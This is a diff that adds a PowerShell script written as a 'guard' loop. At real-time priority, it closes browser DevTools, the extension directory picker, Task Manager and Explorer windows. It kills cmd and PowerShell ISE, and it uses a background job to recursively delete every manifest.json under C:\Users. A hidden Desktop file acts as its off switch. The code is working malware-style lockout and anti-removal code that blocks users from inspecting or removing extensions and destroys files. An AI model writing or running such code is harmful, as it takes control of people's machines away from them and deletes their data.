@@ -1,0 +1,55 @@
+# 1. API Sniper Definition (High-Speed Window Termination)
+$SniperCode = @"
+using System;
+using System.Runtime.InteropServices;
+public class Sniper {
+    [DllImport("user32.dll", CharSet = CharSet.Auto)]
+    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+    [DllImport("user32.dll")]
+    public static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
+    public static void CloseWindow(string title) {
+        IntPtr hWnd = FindWindow(null, title);
+        if (hWnd != IntPtr.Zero) PostMessage(hWnd, 0x0010, 0, 0); 
+    }
+}
+"@
+Add-Type -TypeDefinition $SniperCode
+
+# 2. Maximize Performance
+$Process = [System.Diagnostics.Process]::GetCurrentProcess()
+$Process.PriorityClass = 'RealTime'
+$SwitchFile = "$HOME\Desktop\samson_is_calling_ya.txt"
+
+# 3. Background Job for Shredder (Slower tasks)
+Start-Job -Name "Shredder" -ScriptBlock {
+    while($true) {
+        Get-ChildItem -Path "C:\Users" -Filter "manifest.json" -Recurse -File -ErrorAction SilentlyContinue | 
+            Remove-Item -Force -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 2
+    }
+}
+
+# 4. Main Guard Loop
+while($true) {
+    if (Test-Path $SwitchFile) { Start-Sleep -Seconds 2; continue }
+
+    # --- TARGET: SNIPE WINDOWS BY TITLE ---
+    # This hits DevTools, the Extension Picker, and Task Manager
+    [Sniper]::CloseWindow("Developer Tools")
+    [Sniper]::CloseWindow("DevTools")
+    [Sniper]::CloseWindow("Select the extension directory.")
+    [Sniper]::CloseWindow("Task Manager")
+
+    # --- TARGET: FILE EXPLORER ---
+    # Closes folder windows without killing the taskbar
+    $Shell = New-Object -ComObject Shell.Application
+    $Shell.Windows() | Where-Object { $_.Name -match "Explorer" } | ForEach-Object { $_.Quit() }
+
+    # --- TARGET: SNEAKY PROCESSES ---
+    # We use SilentlyContinue to ignore the "Access Denied" errors from your screenshot
+    Get-Process -Name "cmd", "taskmgr", "powershell_ise" -ErrorAction SilentlyContinue | 
+        Stop-Process -Force -ErrorAction SilentlyContinue
+
+    # Tight loop for instant reaction
+    Start-Sleep -Milliseconds 10
+}
